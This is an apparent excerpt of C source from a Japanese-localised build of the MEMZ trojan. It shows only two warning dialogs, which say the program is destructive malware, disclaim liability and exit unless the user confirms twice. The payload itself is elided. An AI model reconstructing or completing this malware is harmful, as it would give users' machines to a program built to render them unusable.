...
)
{
	...
	if (argc > 1) {
		...
		if (MessageBoxA(NULL, "今実行したソフトウェアは、マルウェアとみなされるものです。\r\n\
このマルウェアは、あなたのコンピュータに害を与え、使用不能にします。\r\n\
何を実行したかわからないままこのメッセージが表示された場合は、「いいえ」を押すだけで、何も起こりません。\r\n\
このマルウェアが何をするか知っていて、安全な環境を使ってテストしているのであれば。 \
「はい」を押して起動します。\r\n\r\n\
このマルウェアを実行して、マシンが使えなくなることを望んでいますか？", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "これは最後の警告です！\r\n\r\n\
このマルウェアを使用して発生したいかなる損害に対しても、制作者は一切の責任を負いません。\r\n\
それでも実行しますか？", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}
